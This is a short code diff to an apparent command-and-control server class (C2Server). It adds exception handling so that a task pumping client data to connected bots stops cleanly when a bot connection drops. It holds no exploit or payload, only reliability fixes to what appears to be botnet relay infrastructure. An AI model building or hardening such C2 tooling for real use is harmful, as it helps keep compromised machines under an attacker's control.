@@ -275,9 +275,18 @@ class C2Server:
                     chunk = await reader.read(4096)
                     if not chunk:
                         break
-                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
+                    try:
+                        await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
+                    except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError):
+                        # Bot connection lost, stop pumping
+                        break
+            except Exception:
+                pass
             finally:
-                await bot.stream.send(Frame(type="END", request_id=req_id))
+                try:
+                    await bot.stream.send(Frame(type="END", request_id=req_id))
+                except Exception:
+                    pass
 
         asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")
 
